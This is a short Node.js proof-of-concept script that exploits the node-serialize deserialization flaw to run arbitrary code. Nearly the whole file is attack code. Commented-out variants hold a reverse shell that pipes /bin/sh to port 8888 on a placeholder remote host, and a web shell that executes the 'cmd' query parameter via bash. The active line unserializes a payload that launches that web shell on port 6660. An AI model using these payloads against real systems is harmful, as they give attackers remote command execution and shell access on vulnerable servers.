const serialize = require('node-serialize');
// var x = '{"rce":"_$$ND_FUNC$$_function (){console.log(\'exploited\')}()"}'
// serialize.unserialize(x);

// const webShell = function(){
//   var net = require("net"),
//     cp = require("child_process"),
//     sh = cp.spawn("/bin/sh",[]);
//   var client = new net.Socket();
//   client.connect(8888,"xxx.xxx.xxx.xxx",function(){
//     client.pipe(sh.stdin);
//     sh.stdout.pipe(client);
//     sh.stderr.pipe(client);
//   });
//   return /a/;
// };

// const webShell = function () {
//   var sys   = require('sys'),
//       exec  = require('child_process').exec,
//       child,
//       http = require('http');
      
//   child = function(res, cmd) {
//     exec('bash -c "' + cmd + '"', 
//     function (error, stdout, stderr) {
//       res.end(stdout);
//       if (error !== null) {
//         console.log('exec error: ' + error);
//       }
//     });
//   };

//   http.createServer(function (req, res) {
//     res.writeHead(200, {'Content-Type': 'text/plain'});
//     var parsedRequest = require('url').parse(req.url, true);
//     var cmd = parsedRequest.query['cmd'];
//     if (cmd != undefined)
//     {
//       console.log("[cmd] " + cmd);
//       child(res, cmd);
//     }
//   }).listen('6660', '127.0.0.1');
// }

// const input = { 'asdf': webShell };
// const serialized = serialize.serialize(input);
// console.log(serialized);

// const serialized = '{"asdf":"_$$ND_FUNC$$_function() { console.log(\'Do it\'); }()"}';
// const serialized = '{"asdf":"_$$ND_FUNC$$_function(){  var net = require(\'net\'),    cp = require(\'child_process\'),    sh = cp.spawn(\'/bin/sh\',[]);  var client = new net.Socket();  client.connect(8888,\'127.0.0.1\',function(){    client.pipe(sh.stdin);    sh.stdout.pipe(client);    sh.stderr.pipe(client);  });  return /a/;}()"}';
// const serialized = '{"asdf":"_$$ND_FUNC$$_function () {  var sys   = require(\'sys\'),      exec  = require(\'child_process\').exec,      child,      http = require(\'http\');        child = function(res, cmd) {    exec(\'bash -c \"\' + cmd + \'\',     function (error, stdout, stderr) {      res.end(stdout);      if (error !== null) {        console.log(\'exec error: \' + error);      }    });  };  http.createServer(function (req, res) { console.log(\'asdf\');   res.writeHead(200, {\'Content-Type\': \'text/plain\'});    var parsedRequest = require(\'url\').parse(req.url, true);    console.log(parsedRequest.query); var cmd = parsedRequest.query[\'cmd\'];    if (cmd != undefined)    {      console.log(\'[cmd] \' + cmd);      child(res, cmd);    }  }).listen(\'6660\', \'127.0.0.1\');}()"}';
const serialized = '{"asdf":"_$$ND_FUNC$$_function () {  var sys   = require(\'sys\'),      exec  = require(\'child_process\').exec,      child,      http = require(\'http\');        child = function(res, cmd) {    exec(cmd, {shell: \'/bin/bash\'},     function (error, stdout, stderr) {      res.end(stdout);      if (error !== null) {        console.log(\'exec error: \' + error);      }    });  };  http.createServer(function (req, res) { console.log(req.url);   res.writeHead(200, {\'Content-Type\': \'text/plain\'});    var parsedRequest = require(\'url\').parse(req.url, true);    var cmd = parsedRequest.query[\'cmd\'];    if (cmd != undefined)    {      console.log(\'[cmd] \' + cmd);      child(res, cmd);    }  }).listen(\'6660\', \'127.0.0.1\');}()"}';
// console.log(serialized)
const unserialized = serialize.unserialize(serialized);
console.log(unserialized);
